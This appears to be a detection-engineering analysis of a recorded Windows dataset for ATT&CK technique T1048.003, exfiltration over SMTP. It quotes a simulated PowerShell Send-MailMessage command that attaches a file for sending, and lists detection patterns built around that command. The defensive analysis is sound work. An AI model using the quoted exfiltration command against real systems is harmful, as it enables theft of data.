# T1048.003-5: Exfiltration Over Unencrypted Non-C2 Protocol — SMTP

## Technique Context

T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol covers data theft using plaintext application protocols like SMTP, FTP, or HTTP. SMTP exfiltration — sending stolen data as email attachments to attacker-controlled addresses — is particularly effective in environments where outbound email is expected and monitored less rigorously than direct data connections. Adversaries have used this technique to disguise exfiltration as routine business email, attaching files as common document types or archive formats.

The specific exfiltration scenario here uses PowerShell's `Send-MailMessage` cmdlet: `Send-MailMessage -From test@corp.com -To test@corp.com -Subject "T1048.003 Atomic Test" -Attachments C:\Windows\System32\notepad.exe -SmtpServer 127.0.0.1`. This simulates an attacker who has configured their own SMTP relay on the compromised host or is using a locally reachable mail server to forward exfiltrated content. The attachment (`notepad.exe`) stands in for a real data file.

Detection focuses on PowerShell's `Send-MailMessage` cmdlet usage outside of legitimate automation contexts, outbound SMTP connections from workstations (which should route through dedicated mail relays, not originate from endpoints), and file attachment patterns where executables or data files from non-standard paths are being sent.

## What This Dataset Contains

With Defender disabled, `Send-MailMessage` attempted the SMTP exfiltration. The technique did not succeed (no SMTP server was listening on 127.0.0.1:25), but the execution attempt is fully documented.

Security EID 4688 captures the child PowerShell process creation with the complete exfiltration command: `"powershell.exe" & {Send-MailMessage -From test@corp.com -To test@corp.com -Subject "T1048.003 Atomic Test" -Attachments C:\Windows\System32\notepad.exe -SmtpServer 127.0.0.1}`. Every element of the exfiltration is exposed in this single event: sender, recipient, subject line, attachment path, and SMTP server.

Sysmon EID 1 confirms the same command line in the process creation record, with `ParentCommandLine: powershell` establishing the test framework context.

The PowerShell channel has 106 EID 4104 and 1 EID 4103 events. The EID 4103 module logging event captures the `Send-MailMessage` cmdlet invocation with all bound parameters, and would include the `NonTerminatingError` indicating connection failure to 127.0.0.1:25.

Sysmon process access events (EID 10) show PowerShell accessing both `whoami.exe` (test framework identity check) and a child `powershell.exe` process. The Sysmon EID 17 named pipe creation events show `\PSHost.134180036095218835.6356.DefaultAppDomain.powershell` and `\PSHost.134180036190481896.3660.DefaultAppDomain.powershell` — two separate PowerShell host process pipes, corresponding to the parent and child PowerShell sessions.

Compared to the defended dataset (51 Sysmon, 14 Security, 50 PowerShell), the undefended run shows fewer events across all channels (34 Sysmon, 4 Security, 107 PowerShell). The defended run had significantly more Sysmon events (51 vs. 34) and Security events (14 vs. 4), which reflects Defender's process monitoring overhead generating additional telemetry. This is an important observation: Defender's active presence can increase total event volume even when it successfully blocks the technique. The undefended run produces cleaner, lower-volume telemetry that is easier to reason about.

## What This Dataset Does Not Contain

No Sysmon EID 3 network connection events appear for the SMTP attempt. The `Send-MailMessage` cmdlet uses the .NET `SmtpClient` class internally, which makes TCP connections through PowerShell process space. Whether a connection attempt (SYN packet) to 127.0.0.1:25 appears in the full Sysmon event stream depends on whether Sysmon captured the failed TCP connection — connection failures may not generate EID 3 events if the handshake never completes.

The attachment file (`notepad.exe`) is not documented as being read or accessed in any event channel — file read operations are not logged by Sysmon's default configuration.

No successful email delivery confirmation exists in any channel. The technique failed because no SMTP server was available on localhost.

## Assessment

This dataset provides clear, unambiguous process execution telemetry for PowerShell SMTP exfiltration. The Security EID 4688 command line contains the entire technique in a single event — sender, recipient, subject, attachment, and SMTP server. This is a strong detection anchor: no legitimate business automation would specify `test@corp.com` as both sender and recipient with a subject containing `"T1048.003 Atomic Test"`, and real-world SMTP exfiltration would have attacker-controlled addresses visible in this same event field.

The lower event volume compared to the defended version is a useful property for detection engineering — the undefended dataset provides a clean baseline of what this technique's execution looks like without Defender's monitoring overhead.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 showing `powershell.exe` with `CommandLine` containing `Send-MailMessage` combined with `-Attachments` pointing to a path outside expected document directories — this directly fingerprints the exfiltration cmdlet with file attachment.

2. PowerShell EID 4104 script block text containing `Send-MailMessage` with `-SmtpServer` specifying a localhost address (127.0.0.1, localhost) or an unexpected external IP — using localhost as an SMTP relay is not a standard enterprise pattern.

3. PowerShell EID 4103 module logging capturing `Send-MailMessage` invocation with all bound parameter values — module logging exposes the complete parameter set at execution time, including sender, recipient, and attachment paths.

4. Sysmon EID 3 (if present in full dataset) showing `powershell.exe` making a TCP connection to port 25 — SMTP connections originating directly from PowerShell rather than a mail client or server are anomalous.

5. Process ancestry: `powershell.exe` (child) spawned from `powershell.exe` (parent) where child command line contains email-related cmdlets (`Send-MailMessage`, `Send-Message`, SMTP) — the parent-spawning-child pattern with email operations indicates scripted exfiltration rather than interactive mail use.

6. PowerShell EID 4104 containing `Send-MailMessage` with `-Attachments` referencing executable files (`.exe`, `.dll`, `.ps1`) — attaching executables to email is a red flag regardless of other context.

7. Temporal correlation: Sysmon EID 11 file creation in a staging path followed within seconds by `Send-MailMessage` in a Security EID 4688 command line — documents the stage-then-email exfiltration workflow.
